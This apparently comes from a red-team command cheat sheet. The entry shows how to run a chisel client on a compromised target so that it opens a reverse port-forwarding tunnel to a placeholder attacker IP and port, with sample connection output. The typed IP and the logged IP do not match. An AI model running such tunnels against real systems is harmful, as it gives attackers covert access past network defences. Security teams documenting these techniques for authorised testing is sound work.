---
id: 830dce4f-01bc-4ad5-b12d-9f18eb36139a
name: Chisel Deploy a Reverse Port Forwarding Client (Target)
type: command
executor: bash
data: chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_DESTINATION_PORT:$_SOURCE_PORT
output: 'bob@securehost:/tmp$ ./chisel client 10.10.10.100:9000 R:9999:52846

  2020/01/21 23:15:32 client: Connecting to ws://10.10.14.45:9000

  2020/01/21 23:15:32 client: Fingerprint ce:ca:15:df:b8:43:2f:19:82:a0:98:fb:07:e1:1f:cc

  2020/01/21 23:15:33 client: Connected (Latency 112.671627ms)'
created_at: '2019-10-02T01:17:50.993449+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Chisel Deploy a Reverse Port Forwarding Client (Target)

```bash
chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_DESTINATION_PORT:$_SOURCE_PORT
```

## Expected Output

```
bob@securehost:/tmp$ ./chisel client 10.10.10.100:9000 R:9999:52846
2020/01/21 23:15:32 client: Connecting to ws://10.10.14.45:9000
2020/01/21 23:15:32 client: Fingerprint ce:ca:15:df:b8:43:2f:19:82:a0:98:fb:07:e1:1f:cc
2020/01/21 23:15:33 client: Connected (Latency 112.671627ms)
```
